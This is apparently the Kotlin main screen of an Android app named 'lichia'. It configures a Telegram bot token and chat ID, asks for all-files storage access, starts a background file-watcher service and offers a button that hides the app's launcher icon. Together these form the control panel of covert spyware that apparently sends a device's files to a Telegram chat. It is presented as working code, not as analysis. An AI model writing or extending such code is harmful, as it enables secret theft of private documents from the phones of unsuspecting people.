package br.com.lichia.app

import android.Manifest
import android.app.Activity
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.view.Gravity
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.Switch
import android.widget.TextView
import android.widget.Toast

class MainActivity : Activity() {

    private val BG = 0xFFFFF0F3.toInt()
    private val SKIN = 0xFFE8507E.toInt()
    private val SKIN_D = 0xFFC2185B.toInt()
    private val INK = 0xFF3E1F2B.toInt()
    private val MUTED = 0xFF8A6470.toInt()


    private lateinit var eToken: EditText
    private lateinit var eChat: EditText
    private lateinit var eMax: EditText
    private lateinit var swDocs: Switch


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val d = resources.displayMetrics.density
        val pad = (16 * d).toInt()


        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(BG)
            setPadding(pad, pad * 2, pad, pad)
        }

        val title = TextView(this).apply {
            text = "lichia"
            textSize = 26f
            setTextColor(SKIN)
            gravity = Gravity.CENTER
        }
        root.addView(title)


        fun L(label: String) = TextView(this@MainActivity).apply {
            text = label
            setTextColor(INK)
            setPadding(0, (10 * d).toInt(), 0, (4 * d).toInt())
        }

        fun E(hint: String): EditText = EditText(this@MainActivity).apply {
            this.hint = hint
            setBackgroundColor(0xFFFFFFFF.toInt())
            setTextColor(INK)
        }


        eToken = E("token do bot do telegram")
        eChat = E("chat id")
        eMax = E("200")

        fun B(label: String, color: Int, onClick: () -> Unit) =
            Button(this).apply {
                text = label
                setBackgroundColor(color)
                setTextColor(0xFFFFFFFF.toInt())
                setOnClickListener { onClick() }
            }


        root.addView(L("token do bot do telegram")); root.addView(eToken)
        root.addView(L("chat id")); root.addView(eChat)
        root.addView(L("max MB por arquivo")); root.addView(eMax)

        swDocs = Switch(this).apply {
            text = "apenas documentos"
            setTextColor(INK)
        }
        root.addView(swDocs)


        root.addView(B("salvar e ativar watcher", SKIN) {
            Prefs.save(this@MainActivity, Prefs.Cfg(
                eToken.text.toString().trim(),
                eChat.text.toString().trim(),
                if (swDocs.isChecked) "docs" else "all",
                eMax.text.toString().trim().toIntOrNull() ?: 200))

            val i = Intent(this@MainActivity, LichiaService::class.java)
            startForegroundService(i)
            if (Build.VERSION.SDK_INT >= 33) {
                requestPermissions(
                    arrayOf(Manifest.permission.POST_NOTIFICATIONS), 1)
            }
            Toast.makeText(this@MainActivity, "lichia ativada",
                Toast.LENGTH_SHORT).show()
        })

        root.addView(B("conceder acesso a arquivos", SKIN_D) {
            try {
                startActivity(Intent(
                    Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                    Uri.parse("package:$packageName")))
            } catch (e: Exception) {
                startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
            }
        })

        root.addView(B("testar bot", SKIN_D) {
            val tk = eToken.text.toString().trim()
            val ci = eChat.text.toString().trim()
            Thread {
                val ok = tk.isNotEmpty() && ci.isNotEmpty() &&
                    TgClient.sendText(tk, ci, "lichia: teste")
                runOnUiThread {
                    Toast.makeText(this@MainActivity,
                        if (ok) "bot ok" else "falhou", Toast.LENGTH_SHORT).show()
                }
            }.start()
        })


        root.addView(B("esconder ícone (reabra por Ajustes → Apps → Lichia)",
            MUTED) {
            packageManager.setComponentEnabledSetting(
                ComponentName(this@MainActivity, "br.com.lichia.app.Launcher"),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP)
            Toast.makeText(this@MainActivity, "ícone oculto",
                Toast.LENGTH_SHORT).show()
        })


        setContentView(root)


        val c = Prefs.read(this)
        eToken.setText(c.token)
        eChat.setText(c.chatId)
        eMax.setText(c.maxMb.toString())
        swDocs.isChecked = c.mode == "docs"
    }
}
